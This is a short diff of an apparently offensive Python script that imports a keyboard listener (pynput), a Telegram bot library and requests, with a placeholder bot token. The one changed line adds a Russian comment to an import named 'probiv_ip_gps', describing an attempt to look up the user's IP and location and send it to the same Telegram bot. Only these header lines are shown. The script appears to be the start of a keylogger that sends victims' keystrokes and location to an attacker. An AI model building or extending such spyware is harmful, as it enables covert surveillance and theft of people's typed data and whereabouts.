@@ -3,7 +3,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 import telebot
 import requests
-from test import probiv_ip_gps
+from test import probiv_ip_gps # попытка пробива пользователя и скинуть его в тотже тг бот 
 
 
 TOKEN = "BOT TOKEN" #vvodim token from botfather
